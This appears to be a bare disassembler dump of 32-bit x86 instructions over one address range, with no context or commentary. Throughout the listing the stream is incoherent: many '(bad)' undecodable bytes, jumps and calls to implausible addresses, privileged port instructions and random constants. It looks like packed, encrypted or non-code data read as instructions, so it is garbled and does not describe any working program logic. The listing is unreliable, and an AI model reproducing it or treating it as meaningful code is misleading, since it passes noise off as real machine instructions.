  42e73a:	mov    cl,0xec
  42e73c:	jne    0x42e74e
  42e73e:	inc    ebp
  42e73f:	jmp    0x3958bf1e
  42e744:	(bad)  
  42e745:	mov    edi,0x66662d79
  42e74a:	add    al,0x31
  42e74c:	xchg   ebx,eax
  42e74d:	and    ebp,ecx
  42e74f:	ret    
  42e750:	push   0xd74700d9
  42e755:	aam    0x24
  42e757:	mov    es:0x739e5393,al
  42e75d:	sbb    DWORD PTR [edi],ecx
  42e75f:	sub    DWORD PTR [esi+0x30],esp
  42e762:	pop    ebx
  42e763:	sub    al,0xa9
  42e765:	push   edx
  42e766:	push   edx
  42e767:	push   ds
  42e768:	mov    ch,0xdf
  42e76a:	jns    0x42e791
  42e76c:	pop    esi
  42e76d:	sub    BYTE PTR [esi+0x4cecf57b],al
  42e773:	(bad)  [ecx-0x6e0b796d]
  42e779:	push   cs
  42e77a:	inc    ebp
  42e77b:	jmp    0xcf9bcecb
  42e780:	add    BYTE PTR [ebx+0x6100a579],bh
  42e786:	cmp    DWORD PTR [eax+0x0],0x8500dd61
  42e78d:	ins    DWORD PTR es:[edi],dx
  42e78e:	mov    BYTE PTR [ecx],al
  42e790:	and    DWORD PTR [esi],ebp
  42e792:	(bad)  
  42e793:	jne    0x42e7d9
  42e795:	cmp    eax,DWORD PTR [eax]
  42e797:	or     al,0x6a
  42e799:	or     eax,DWORD PTR [ecx-0x39b2740a]
  42e79f:	(bad)  
  42e7a0:	call   0x3c7339
  42e7a5:	cwde   
  42e7a6:	int    0x75
  42e7a8:	inc    esp
  42e7a9:	or     esp,DWORD PTR [esi+esi*8+0x40e8cb15]
  42e7b0:	add    ah,dl
  42e7b2:	lods   al,BYTE PTR ds:[esi]
  42e7b3:	mov    edx,0x4ea4ce53
  42e7b8:	mov    esp,DWORD PTR [edx-0x38421139]
  42e7be:	mov    edi,DWORD PTR ds:0xf75e8e00
  42e7c4:	mov    DWORD PTR [eax+0xa],ebp
  42e7c7:	adc    eax,0xf996994c
  42e7cc:	gs jmp 0x84b4:0xbb4475f2
  42e7d4:	shr    BYTE PTR [edi-0x38],0x81
  42e7d8:	or     eax,0x3d8bb7
  42e7dd:	(bad)  
  42e7de:	and    al,0x6e
  42e7e0:	sub    eax,DWORD PTR [ebx+eax*2+0x605ee8c9]
  42e7e7:	stc    
  42e7e8:	inc    DWORD PTR [eax]
  42e7ea:	push   cs
  42e7eb:	push   ss
  42e7ec:	outs   dx,BYTE PTR ds:[esi]
  42e7ed:	pop    ds
  42e7ee:	test   BYTE PTR [ebx+0x3c],al
  42e7f1:	and    al,0x74
  42e7f3:	push   edx
  42e7f4:	stc    
  42e7f5:	mov    BYTE PTR [eax+0x59],bh
  42e7f8:	div    BYTE PTR [ecx+ebx*2-0x80]
  42e7fc:	sbb    DWORD PTR [ecx+0x1d],ebx
  42e7ff:	aad    0xc
  42e801:	jo     0x42e865
  42e803:	scas   eax,DWORD PTR es:[edi]
  42e804:	stc    
  42e805:	popa   
  42e806:	(bad)  [ebx-0x2c86be13]
  42e80c:	out    dx,eax
  42e80d:	lock (bad) 
  42e80f:	rcl    DWORD PTR [eax],cl
  42e811:	inc    eax
  42e812:	push   eax
  42e813:	inc    eax
  42e814:	std    
  42e815:	xchg   BYTE PTR ds:0xb95cd363,bl
  42e81b:	mov    edi,0xff0686d0
  42e820:	pop    ecx
  42e821:	mul    ebx
  42e823:	fucomi st,st(1)
  42e825:	inc    BYTE PTR ds:0xe951ce80
  42e82b:	adc    al,0x6
  42e82d:	push   ebx
  42e82e:	fisttp WORD PTR [ecx-0x7e5f7bfd]
  42e834:	std    
  42e835:	(bad)  
  42e836:	cli    
  42e837:	cdq    
  42e838:	mov    al,ds:0x4503ddfa
  42e83d:	or     bl,dh
  42e83f:	in     al,dx
  42e840:	std    
  42e841:	jmp    DWORD PTR [edx+0x1]
  42e844:	repz add esp,DWORD PTR [ebx+0x7e]
  42e848:	std    
  42e849:	jmp    FWORD PTR [ebp+0x5]
  42e84c:	stos   DWORD PTR es:[edi],eax
  42e84d:	inc    DWORD PTR [eax]
  42e84f:	mov    ch,0x7f
  42e851:	mov    eax,0x4c42d0b
  42e856:	dec    edi
  42e857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e858:	lods   al,BYTE PTR ds:[esi]
  42e859:	ror    DWORD PTR ds:0xa0db8022,0x4a
  42e860:	repz sar bh,0x7
  42e864:	add    eax,0xdde0a45
  42e869:	add    eax,0x74196200
  42e86e:	cli    
  42e86f:	bound  eax,QWORD PTR [eax-0x35d0125]
  42e875:	shl    BYTE PTR [ebx],1
  42e877:	ds leave 
  42e879:	inc    ebp
  42e87a:	call   FWORD PTR [ebp-0x26]
  42e87d:	out    0xdd,eax
  42e87f:	hlt    
  42e880:	rcr    edx,0xbf
  42e883:	dec    ebp
  42e884:	jns    0x42e8d0
  42e886:	pop    ecx
  42e887:	inc    esi
  42e888:	xchg   ecx,eax
  42e889:	mov    eax,0xfb5a986
  42e88e:	ins    BYTE PTR es:[edi],dx
  42e88f:	call   DWORD PTR [ecx+0x39]
  42e892:	jne    0x42e878
  42e894:	xchg   ecx,eax
  42e895:	ins    BYTE PTR es:[edi],dx
  42e896:	jne    0x42e849
  42e898:	neg    DWORD PTR [eax+edx*8+0x41]
  42e89c:	int    0x60
  42e89e:	cmp    eax,0x6be79115
  42e8a3:	sbb    dh,BYTE PTR [ebp+0x25d67514]
  42e8a9:	les    edx,FWORD PTR [ebx]
  42e8ab:	mov    ebx,0x6203e7a1
  42e8b0:	cmp    DWORD PTR [esi],0x90ee0059
  42e8b6:	repnz push cs
  42e8b8:	inc    edx
  42e8b9:	jmp    0x42e862
  42e8bb:	add    esi,DWORD PTR [edx]
  42e8bd:	cmp    dl,BYTE PTR [edi]
  42e8bf:	cmc    
  42e8c0:	and    ecx,ebx
  42e8c2:	fisubr DWORD PTR [esi]
  42e8c4:	fimul  DWORD PTR [ecx]
  42e8c6:	sub    al,0x4
  42e8c8:	fistp  WORD PTR [ecx-0xe7e38a4]
  42e8ce:	repnz mov esi,0xbf6d2a9d
  42e8d4:	and    DWORD PTR [ecx],0xb5e18718
  42e8da:	pop    edi
  42e8db:	add    ah,BYTE PTR [edx-0x27]
  42e8de:	verr   WORD PTR [ebx-0x27]
  42e8e2:	out    0xd3,eax
  42e8e4:	test   DWORD PTR [ecx+0x5c62037b],ecx
  42e8ea:	mov    ds:0xcb55ef1b,eax
  42e8ef:	sti    
  42e8f0:	(bad)  
  42e8f1:	(bad)  
  42e8f3:	int3   
  42e8f4:	sbb    eax,0xd61c0081
  42e8f9:	nop
  42e8fa:	stc    
  42e8fb:	bound  ebx,QWORD PTR [esi+0x2b]
  42e8fe:	cli    
  42e8ff:	mov    ecx,0xf4fa2069
  42e904:	and    esi,ebx
  42e906:	inc    eax
  42e907:	jmp    0xcfc2e7c6
  42e90c:	cmp    eax,0x61e90090
  42e911:	push   es
  42e912:	push   0x15d8376a
  42e917:	mov    ebp,0x445d4200
  42e91c:	add    eax,0xfcfa201e
  42e921:	loope  0x42e90e
  42e923:	inc    eax
  42e924:	jmp    0xbdb739b5
  42e929:	sti    
  42e92a:	(bad)  
  42e92b:	addr16 loopne 0x42e912
  42e92e:	sbb    esp,DWORD PTR ds:0x845d11e1
  42e934:	lds    ebp,FWORD PTR [ebp-0x70]
  42e937:	stc    
  42e938:	jmp    0xa7fccc4e
  42e93d:	addr16 mov dh,0xf9
  42e940:	jmp    0xde93c2a6
  42e945:	enter  0xf9d7,0xfc
  42e949:	fucomp st(3)
  42e94b:	inc    eax
  42e94c:	jmp    0x15bd393b
  42e951:	fld    QWORD PTR [edi+0x106333ff]
  42e957:	jnp    0x42e93a
  42e959:	test   eax,0x7e700804
  42e95e:	xor    eax,0xe534e940
  42e963:	jns    0x42e956
  42e965:	jnp    0x42e975
  42e967:	jge    0x42e936
  42e969:	jno    0x42e924
  42e96b:	outs   dx,BYTE PTR ds:[esi]
  42e96c:	stc    
  42e96d:	xor    al,0xa2
  42e96f:	bound  eax,QWORD PTR [eax]
  42e971:	repnz cwde 
  42e973:	cmp    eax,0x1d98fe10
  42e978:	adc    bl,ah
  42e97a:	in     eax,0xfb
  42e97c:	inc    DWORD PTR [eax]
  42e97e:	int3   
  42e97f:	mov    bl,0xf6
  42e981:	adc    eax,0x40e6c3
  42e986:	or     al,0xa9
  42e988:	push   edx
  42e989:	mov    edx,DWORD PTR [esi+0x4b04bba8]
  42e98f:	mov    cl,0x82
  42e991:	je     0x42e9fa
  42e993:	lea    ecx,[esi+0x56]
  42e996:	ins    BYTE PTR es:[edi],dx
  42e997:	lock add BYTE PTR [ebx+edi*8],dl
  42e99b:	fiadd  DWORD PTR [ecx-0x64df5c08]
  42e9a1:	(bad)  
  42e9a2:	cmp    al,0x61
  42e9a4:	mov    ecx,0xf958870f
  42e9a9:	(bad)  
  42e9aa:	sti    
  42e9ab:	popa   
  42e9ac:	test   BYTE PTR [edi],0x87
  42e9af:	pusha  
  42e9b0:	stc    
  42e9b1:	dec    DWORD PTR [ebx]
  42e9b3:	pop    eax
  42e9b4:	test   DWORD PTR [ecx],0xfe7a8c77
  42e9ba:	inc    BYTE PTR [esi-0x1c327cfc]
  42e9c0:	jae    0x42ea38
  42e9c2:	cwde   
  42e9c3:	mov    dl,0xf6
  42e9c5:	adc    eax,0x40e607
  42e9ca:	inc    eax
  42e9cb:	and    al,BYTE PTR [ebp+0x478217db]
  42e9d1:	je     0x42e995
  42e9d3:	push   edi
  42e9d4:	out    0x6,eax
  42e9d6:	ja     0x42e9b2
  42e9d8:	jns    0x42e9c8
  42e9da:	mov    ch,0x91
  42e9dc:	std    
  42e9dd:	mov    bl,al
  42e9df:	das    
  42e9e0:	adc    al,0x8b
  42e9e2:	add    BYTE PTR [edi-0x3f],dh
  42e9e5:	adc    bl,ch
  42e9e7:	xchg   edi,eax
  42e9e8:	mov    edi,0x35b6241
  42e9ee:	das    
  42e9ef:	stos   DWORD PTR es:[edi],eax
  42e9f0:	fiadd  DWORD PTR [esi+eiz*2]
  42e9f3:	jne    0x42ea00
  42e9f5:	push   ebx
  42e9f6:	out    0x16,eax
  42e9f8:	mov    ebp,?
  42e9fa:	(bad)  
  42e9fb:	fst    DWORD PTR [eax]
  42e9fd:	mov    ecx,esi
  42e9ff:	(bad)  
  42ea00:	push   ecx
  42ea01:	fdivr  DWORD PTR [esi+eiz*2-0x49003e89]
  42ea08:	das    
  42ea09:	sbb    DWORD PTR [eax+esi*2+0x40],ecx
  42ea0d:	std    
  42ea0e:	mov    eax,0xffbd548e
  42ea13:	cmp    eax,0x2dfa699a
  42ea18:	or     eax,DWORD PTR [eax-0x19]
  42ea1b:	mov    cl,0xc4
  42ea1d:	outs   dx,BYTE PTR ds:[esi]
  42ea1e:	cli    
  42ea1f:	mov    bh,0xbf
  42ea21:	sbb    BYTE PTR [eax+0x70],al
  42ea24:	inc    eax
  42ea25:	std    
  42ea26:	pop    esp
  42ea27:	dec    ecx
  42ea28:	repz icebp 
  42ea2a:	add    bl,cl
  42ea2c:	mov    ch,0x55
  42ea2e:	fdiv   QWORD PTR ds:0xf552fd80
  42ea34:	lods   al,BYTE PTR ds:[esi]
  42ea35:	xor    eax,0xca80a210
  42ea3a:	xchg   BYTE PTR ds:0x66bdcf67,bl
  42ea40:	adc    bh,0x86
  42ea43:	ror    DWORD PTR [edx],cl
  42ea45:	mov    edi,0x75a5006f
  42ea4a:	sub    eax,0x828022a4
  42ea4f:	enter  0x7536,0x55
  42ea53:	mov    bl,0x9b
  42ea55:	xchg   esp,eax
  42ea56:	outs   dx,DWORD PTR ds:[esi]
  42ea57:	xchg   BYTE PTR [edi+eiz*4+0x46a5d9b5],bl
  42ea5e:	jbe    0x42eaa3
  42ea60:	inc    esi
  42ea61:	js     0x42ea61
  42ea63:	jae    0x42eac2
  42ea65:	fldcw  WORD PTR [esi+0x42]
  42ea68:	test   DWORD PTR [edx+edx*8],esi
  42ea6b:	add    esp,DWORD PTR [edx+0x62]
  42ea6e:	test   eax,0xe7d4bfd2
  42ea73:	(bad)  
  42ea74:	fdivr  QWORD PTR [esi+edx*1-0x26]
  42ea78:	adc    BYTE PTR [esi-0x5022f40c],cl
  42ea7e:	jb     0x42ea77
  42ea80:	jno    0x42ea4a
  42ea82:	mov    al,ds:0x62e9ce71
  42ea87:	neg    DWORD PTR [ecx-0x74]
  42ea8a:	aam    0xfb
  42ea8c:	xchg   edi,eax
  42ea8d:	enter  0x5c35,0x2c
  42ea91:	(bad)  
  42ea93:	add    ebx,ebp
  42ea95:	xchg   ecx,eax
  42ea96:	ins    BYTE PTR es:[edi],dx
  42ea97:	jno    0x42eaf1
  42ea99:	push   ebp
  42ea9a:	data16 add al,0x62
  42ea9d:	fdecstp 
  42ea9f:	inc    ebx
  42eaa0:	adc    edx,0xffffffa6
  42eaa3:	and    ecx,DWORD PTR [esi-0x4dec7236]
  42eaa9:	pop    esi
  42eaaa:	xchg   edx,eax
  42eaab:	mov    DWORD PTR [eax],0xe7fc8cb3
  42eab1:	push   ebx
  42eab2:	sbb    eax,ebp
  42eab4:	test   BYTE PTR [ecx],ah
  42eab6:	fimul  WORD PTR [ebp+0x70f38a05]
  42eabc:	or     al,BYTE PTR [eax+0x6923a660]
  42eac2:	inc    ebx
  42eac3:	sahf   
  42eac4:	and    al,BYTE PTR [eax-0x66]
  42eac7:	(bad)  
  42eac8:	sti    
  42eac9:	inc    ebx
  42eaca:	loopne 0x42ea7b
  42eacc:	jmp    0x7d6d07ab
  42ead1:	jl     0x42eac0
  42ead3:	pusha  
  42ead4:	enter  0xc81d,0xa7
  42ead8:	jmp    0xf8370347
  42eadd:	and    edi,edi
  42eadf:	add    ch,dl
  42eae1:	mov    cl,0x5d
  42eae3:	jno    0x42eafa
  42eae5:	mov    eax,0x680d138f
  42eaea:	sbb    DWORD PTR [ecx],eax
  42eaec:	push   0x1d
  42eaee:	loopne 0x42eb56
  42eaf0:	(bad)  
  42eaf1:	test   eax,0x8be787fa
  42eaf6:	push   ebx
  42eaf7:	cmp    eax,0x454762bd
  42eafc:	mov    ah,0xde
  42eafe:	neg    DWORD PTR [eax-0x17]
  42eb01:	dec    ebx
  42eb02:	cdq    
  42eb03:	loopne 0x42eae6
  42eb05:	dec    ebx
  42eb06:	ror    eax,cl
  42eb08:	shl    DWORD PTR [ecx+0x5e],cl
  42eb0b:	cmp    eax,0x415d2e05
  42eb10:	mov    ch,0x0
  42eb12:	adc    edx,edi
  42eb14:	xchg   DWORD PTR [esi-0x5aec70e5],ebx
  42eb1a:	dec    ebx
  42eb1b:	sbb    DWORD PTR [ecx],eax
  42eb1d:	push   0xffffff9d
  42eb1f:	loopne 0x42eb9e
  42eb21:	into   
  42eb22:	cmp    eax,0x3226868c
  42eb27:	xor    dl,BYTE PTR [esi-0x3c]
  42eb2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb2b:	call   0x80c99f30
  42eb30:	dec    edi
  42eb31:	out    0xba,al
  42eb33:	fdivr  DWORD PTR [ebp+0x11]
  42eb36:	pop    edi
  42eb37:	push   es
  42eb38:	add    esi,DWORD PTR [edx-0x60]
  42eb3b:	mov    ebx,0xc6212c7
  42eb40:	stc    
  42eb41:	(bad)  
  42eb43:	xlat   BYTE PTR ds:[ebx]
  42eb44:	sub    eax,0x85da3629
  42eb49:	sub    al,0x6a
  42eb4b:	push   esp
  42eb4c:	dec    ebx
  42eb4d:	cmc    
  42eb4e:	stos   DWORD PTR es:[edi],eax
  42eb4f:	mov    edi,edx
  42eb51:	pop    esp
  42eb52:	pop    edx
  42eb53:	nop
  42eb54:	jae    0x42eb4f
  42eb56:	fwait
  42eb57:	mov    edi,edx
  42eb59:	add    BYTE PTR [esi-0x73],ch
  42eb5c:	dec    ebx
  42eb5d:	mov    ecx,edx
  42eb5f:	cmpps  xmm5,xmm0,0x8e
  42eb63:	xlat   BYTE PTR ds:[ebx]
  42eb64:	add    BYTE PTR [eax],al
  42eb66:	jb     0x42eb12
  42eb68:	mov    ebx,0xe5547b14
  42eb6d:	adc    al,0x7a
  42eb6f:	xlat   BYTE PTR ds:[ebx]
  42eb70:	add    BYTE PTR [ebx+0x3e],dl
  42eb73:	mov    ds:0x7e0064b7,eax
  42eb78:	xlat   BYTE PTR ds:[ebx]
  42eb79:	add    BYTE PTR [edi-0xe],dl
  42eb7c:	mov    al,0x1d
  42eb7e:	adc    dl,dh
  42eb80:	cwde   
  42eb81:	sbb    eax,0x1d431214
  42eb86:	cmp    BYTE PTR [edx-0x29],cl
  42eb89:	add    BYTE PTR [edi],cl
  42eb8b:	mov    esp,0x3bfff970
  42eb90:	adc    BYTE PTR ds:0xf9973bfc,ch
  42eb96:	imul   ecx,DWORD PTR [edi],0xa453d1c8
  42eb9c:	ror    BYTE PTR [eax+0x7f],1
  42eb9f:	call   esi
  42eba1:	cmc    
  42eba2:	aad    0x80
  42eba4:	std    
  42eba5:	test   bh,bh
  42eba7:	iret   
  42eba8:	fiadd  DWORD PTR [ecx-0x2ac68c31]
  42ebae:	jmp    DWORD PTR [esi+eax*8-0x40]
  42ebb2:	(bad)  
  42ebb3:	or     al,0xc7
  42ebb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ebb6:	inc    eax
  42ebb7:	or     esi,DWORD PTR [ebp-0x78]
  42ebba:	inc    edi
  42ebbb:	mov    edi,0xcf478874
  42ebc0:	or     eax,0xd7607057
  42ebc5:	cmp    ebx,0x5a6dfa3e
  42ebcb:	sub    DWORD PTR [ecx+0x1d],0x3c
  42ebcf:	mov    edx,0x627400d6
  42ebd4:	sbb    eax,0x8062c7dd
  42ebd9:	std    
  42ebda:	dec    esi
  42ebdb:	add    BYTE PTR [ebp+0x1e7ab58d],ch
  42ebe1:	sub    BYTE PTR [edx-0x2c],0xe9
  42ebe5:	push   eax
  42ebe6:	mov    cl,dh
  42ebe8:	push   cs
  42ebe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ebea:	jbe    0x42ebb5
  42ebec:	jp     0x42ebd3
  42ebee:	push   eax
  42ebef:	cli    
  42ebf0:	test   DWORD PTR [edi-0x139b3dc3],ebp
  42ebf6:	sahf   
  42ebf7:	aas    
  42ebf8:	(bad)  
  42ebfa:	jnp    0x42ec3d
  42ebfc:	sbb    ah,BYTE PTR [edi-0x1]
  42ebff:	xchg   BYTE PTR [ecx+0x9],dh
  42ec02:	rep outs dx,DWORD PTR ds:[esi]
  42ec04:	out    0x9,eax
  42ec06:	repnz adc ch,cl
  42ec09:	push   0x55
  42ec0b:	(bad)  
  42ec0c:	cs repz push 0xffffff83
  42ec10:	and    ah,BYTE PTR [ecx+edi*8+0x55b0ad86]
  42ec17:	mov    ebx,0x836b1b16
  42ec1c:	and    cl,BYTE PTR [ebp+0x12]
  42ec1f:	xchg   DWORD PTR [ebp-0x5a],ebx
  42ec22:	add    al,0x87
  42ec24:	sub    eax,0x222f0dc3
  42ec29:	pop    ebx
  42ec2a:	retf   
  42ec2b:	pop    esp
  42ec2c:	test   eax,0x63134201
  42ec31:	cmp    ch,0xbd
  42ec34:	pop    edx
  42ec35:	sub    BYTE PTR [ebx-0x27fa09d],0x86
  42ec3c:	ficomp WORD PTR [ebx+0x62000125]
  42ec42:	and    BYTE PTR [edi-0x27f9c31],0x36
  42ec49:	test   al,0x3
  42ec4b:	xor    DWORD PTR [edi],esi
  42ec4d:	pushf  
  42ec4e:	fcomp  DWORD PTR [ebx+0x2b]
  42ec51:	xlat   BYTE PTR ds:[ebx]
  42ec52:	push   edi
  42ec53:	scas   eax,DWORD PTR es:[edi]
  42ec54:	add    al,0x62
  42ec56:	(bad)  
  42ec58:	mov    ah,0x8d
  42ec5a:	pop    ebp
  42ec5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec5c:	sub    DWORD PTR [ebx+ecx*1-0x50931a11],esp
  42ec63:	jmp    0x7c42:0x7ad9adc1
  42ec6a:	fild   WORD PTR [ecx+0x29]
  42ec6d:	test   al,0xd9
  42ec6f:	and    eax,0xa1425874
  42ec74:	sbb    ah,BYTE PTR [ebx-0x4c025f3b]
  42ec7a:	test   al,0x28
  42ec7c:	pop    esp
  42ec7d:	ret    
  42ec7e:	(bad)  
  42ec7f:	sub    BYTE PTR [ebp-0x24],0x5c
  42ec83:	ret    
  42ec84:	sub    esp,DWORD PTR [ebx-0x27]
  42ec87:	out    0x79,eax
  42ec89:	sub    eax,0xc34131d9
  42ec8e:	fsubr  QWORD PTR [eax]
  42ec90:	fidivr DWORD PTR [ecx+0x22]
  42ec93:	ret    0x2300
  42ec96:	fstp   DWORD PTR [edx-0x5dad3cc4]
  42ec9c:	pop    ss
  42ec9d:	cmp    bh,bl
  42ec9f:	cld    
  42eca0:	add    esp,DWORD PTR [edx+0x52]
  42eca3:	mov    ds:0x99e70013,al
  42eca8:	loop   0x42ec31
  42ecaa:	xchg   ecx,eax
  42ecab:	mov    BYTE PTR [edx],ch
  42ecad:	ins    DWORD PTR es:[edi],dx
  42ecae:	in     al,0x1d
  42ecb0:	int3   
  42ecb1:	pop    ss
  42ecb2:	fistp  WORD PTR [ecx-0x167bec6d]
  42ecb8:	mov    bh,0x7e
  42ecba:	mov    al,ds:0x566cb81d
  42ecbf:	and    eax,0x5be5c3da
  42ecc4:	and    eax,DWORD PTR [eax]
  42ecc6:	in     eax,0x1d
  42ecc8:	add    ebp,ecx
  42ecca:	jno    0x42ed2a
  42eccc:	shl    BYTE PTR [ebp+0x71],0xff
  42ecd0:	sbb    al,0x39
  42ecd2:	inc    ebp
  42ecd3:	sbb    edx,DWORD PTR [ebp+0x39]
  42ecd6:	dec    edi
  42ecd7:	in     eax,dx
  42ecd8:	pop    esp
  42ecd9:	jmp    DWORD PTR [ecx-0x525a8178]
  42ecdf:	pop    esi
  42ece0:	test   BYTE PTR ds:0xe900da46,cl
  42ece6:	push   cs
  42ece7:	dec    esp
  42ece8:	and    al,0x5
  42ecea:	popa   
  42eceb:	fld    DWORD PTR [eax]
  42eced:	pop    esp
  42ecee:	scas   al,BYTE PTR es:[edi]
  42ecef:	jmp    0xe8ff:0xb53d5df9
  42ecf6:	popa   
  42ecf7:	pop    edi
  42ecf8:	int    0x62
  42ecfa:	xor    al,0xb4
  42ecfc:	cs adc al,0x5f
  42ecff:	jno    0x42ece7
  42ed01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ed02:	test   BYTE PTR [edx-0x4322c8f7],0x30
  42ed09:	call   0x2e1c4e0e
  42ed0e:	fwait
  42ed0f:	loope  0x42ed54
  42ed11:	and    al,0x19
  42ed13:	popa   
  42ed14:	fld    DWORD PTR [eax]
  42ed16:	in     eax,0x3e
  42ed18:	sbb    eax,edi
  42ed1a:	popa   
  42ed1b:	hlt    
  42ed1c:	fsub   st,st(5)
  42ed1e:	in     al,0x89
  42ed20:	lahf   
  42ed21:	fadd   QWORD PTR [esi-0x4a]
  42ed24:	pop    edi
  42ed25:	jno    0x42ed00
  42ed27:	cmp    esi,DWORD PTR [ebx+edx*2+0x5ced869f]
  42ed2e:	xlat   BYTE PTR ds:[ebx]
  42ed2f:	and    DWORD PTR [eax+0x1d3d5586],ecx
  42ed35:	add    cl,ch
  42ed37:	popa   
  42ed38:	cs cli 
  42ed3a:	pop    ebp
  42ed3b:	cmp    eax,0x61e9001d
  42ed40:	or     bl,al
  42ed42:	add    BYTE PTR [edi],cl
  42ed44:	scas   al,BYTE PTR es:[edi]
  42ed45:	not    BYTE PTR ds:0x40edff
  42ed4b:	dec    eax
  42ed4c:	and    BYTE PTR [esi],cl
  42ed4e:	setne  BYTE PTR [ecx]
  42ed51:	add    DWORD PTR fs:[esi-0x7f],ecx
  42ed55:	daa    
  42ed56:	call   0x38caf0
  42ed5b:	mov    esp,0x4143e4a
  42ed60:	cdq    
  42ed61:	sbb    eax,0xdbb718
  42ed66:	add    BYTE PTR [esi],al
  42ed68:	sbb    eax,0xf47b0d6e
  42ed6d:	outs   dx,BYTE PTR ds:[esi]
  42ed6e:	adc    BYTE PTR [eax],al
  42ed70:	cs inc ecx
  42ed72:	sbb    eax,0x35dff320
  42ed77:	(bad)  
  42ed78:	fadd   QWORD PTR [edi]
  42ed7a:	mov    edi,0xf6f31be9
  42ed7f:	dec    DWORD PTR [ecx+ecx*2+0x4377243d]
  42ed86:	ins    DWORD PTR es:[edi],dx
  42ed87:	push   cs
  42ed88:	xchg   ebx,eax
  42ed89:	mov    BYTE PTR ds:0x5fa98a8d,cl
  42ed8f:	adc    DWORD PTR [ebx],0xffffffec
  42ed92:	jae    0x42ed9f
  42ed94:	mov    al,0x86
  42ed96:	mov    WORD PTR [ecx+0x7],es
  42ed99:	jns    0x42ee15
  42ed9b:	cmp    BYTE PTR [ecx+0x77],cl
  42ed9e:	sti    
  42ed9f:	xor    bh,BYTE PTR [ebx+0x1f]
  42eda2:	(bad)  
  42eda3:	jmp    DWORD PTR [ebp-0x28]
  42eda6:	or     BYTE PTR [ebp-0x39],dh
  42eda9:	(bad)  
  42edab:	je     0x42edc2
  42edad:	test   eax,0x46d77cb7
  42edb2:	stc    
  42edb3:	push   ebp
  42edb4:	cmp    al,0xe8
  42edb6:	dec    esp
  42edb7:	adc    cl,bl
  42edb9:	fisub  DWORD PTR [eax-0x469a9df8]
  42edbf:	inc    ebp
  42edc1:	jno    0x42edb3
  42edc3:	pop    ss
  42edc4:	loope  0x42ed5b
  42edc6:	gs ins DWORD PTR es:[edi],dx
  42edc8:	es jo  0x42edc8
  42edcb:	or     esp,DWORD PTR [ebx-0x49]
  42edce:	dec    DWORD PTR [ebx]
  42edd0:	push   edi
  42edd1:	cmp    al,0xfd
  42edd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42edd4:	add    BYTE PTR [esi+0x6a9e04b2],ch
  42edda:	sub    eax,0xaf0fffc1
  42eddf:	adc    BYTE PTR [eax+0x50],al
  42ede2:	mov    al,0x4
  42ede4:	pop    edx
  42ede5:	mov    eax,ds:0x9a3479e6
  42edea:	ret    0xffc0
  42eded:	fiadd  WORD PTR [esi-0x17]
  42edf0:	or     ecx,ebx
  42edf2:	push   bp
  42edf4:	punpckldq mm6,DWORD PTR [eax-0x3]
  42edf8:	xchg   BYTE PTR [eax+ebp*2+0x70623423],ch
  42edff:	and    BYTE PTR [edx+ebp*2],0xe2
  42ee03:	sar    bh,0x65
  42ee06:	mov    esi,0xbb55141
  42ee0b:	ins    DWORD PTR es:[edi],dx
  42ee0c:	cs dec esp
  42ee0e:	dec    ecx
  42ee0f:	out    dx,al
  42ee10:	pop    ds
  42ee11:	aam    0x36
  42ee13:	rcl    BYTE PTR [ecx+ebx*8+0x36],cl
  42ee17:	add    DWORD PTR [edi-0x297f9fa2],eax
  42ee1d:	scas   al,BYTE PTR es:[edi]
  42ee1e:	fidivr DWORD PTR [ecx-0x7a]
  42ee21:	jp     0x42ee9b
  42ee23:	std    
  42ee24:	(bad)  
  42ee25:	cmp    al,bh
  42ee27:	xor    al,BYTE PTR [eax]
  42ee29:	bound  ecx,QWORD PTR [ebx]
  42ee2b:	fwait
  42ee2c:	sub    ebp,DWORD PTR [edx+0x70]
  42ee2f:	std    
  42ee30:	test   bh,bh
  42ee32:	dec    ebx
  42ee33:	test   DWORD PTR [esi+0x1f0fd917],0xe7d95700
  42ee3d:	jle    0x42ee65
  42ee3f:	jno    0x42ee73
  42ee41:	ss (bad) 
  42ee43:	fstp   DWORD PTR [esi+0x3e]
  42ee46:	std    
  42ee47:	mov    al,ds:0x1f6203b6
  42ee4c:	mov    edi,0x2a0b75f2
  42ee51:	enter  0x2e34,0xeb
  42ee55:	pmaxsw mm5,mm2
  42ee58:	daa    
  42ee59:	add    al,0xef
  42ee5b:	or     eax,0x9dab7d00
  42ee60:	jmp    0xe85bb6e0
  42ee65:	pop    ebx
  42ee66:	mov    ebp,0xe469c148
  42ee6b:	push   ss
  42ee6c:	in     al,0xc8
  42ee6e:	mov    al,ds:0x4da3dbde
  42ee73:	(bad)  [ecx]
  42ee75:	pop    ebx
  42ee76:	mov    edx,0x1303e7c9
  42ee7b:	sub    dh,BYTE PTR ds:0x135210d2
  42ee81:	and    BYTE PTR [edx+0x52],cl
  42ee84:	cmp    BYTE PTR [ebx-0x7],0xbc
  42ee88:	xlat   BYTE PTR ds:[ebx]
  42ee89:	jle    0x42eee3
  42ee8b:	aad    0x63
  42ee8d:	shl    BYTE PTR [edx-0x27],0xe7
  42ee91:	test   BYTE PTR [eax-0x7b],cl
  42ee94:	fidivr DWORD PTR [edi-0x74]
  42ee97:	(bad)  
  42ee99:	add    ecx,DWORD PTR [ebp+0x556ea0]
  42ee9f:	jp     0x42eecf
  42eea1:	or     dl,dh
  42eea3:	dec    edi
  42eea4:	push   eax
  42eea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eea6:	pop    es
  42eea7:	fst    st(1)
  42eea9:	ins    BYTE PTR es:[edi],dx
  42eeaa:	cmp    edx,DWORD PTR [ecx-0x70d4ff17]
  42eeb0:	aad    0x0
  42eeb2:	arpl   WORD PTR [edx],bx
  42eeb4:	mov    ecx,0xd918f11c
  42eeb9:	jmpw   0xf7eb
  42eebd:	inc    ebp
  42eebe:	stos   DWORD PTR es:[edi],eax
  42eebf:	fiadd  WORD PTR [esp+eax*1-0x2e]
  42eec3:	sbb    al,0xe5
  42eec5:	outs   dx,BYTE PTR ds:[esi]
  42eec6:	or     dh,bl
  42eec8:	add    BYTE PTR ds:0x84d061c9,ah
  42eece:	in     al,0x60
  42eed0:	fld    DWORD PTR [eax]
  42eed2:	cmp    DWORD PTR [ebp-0x2f],0xdca7e900
  42eed9:	stc    
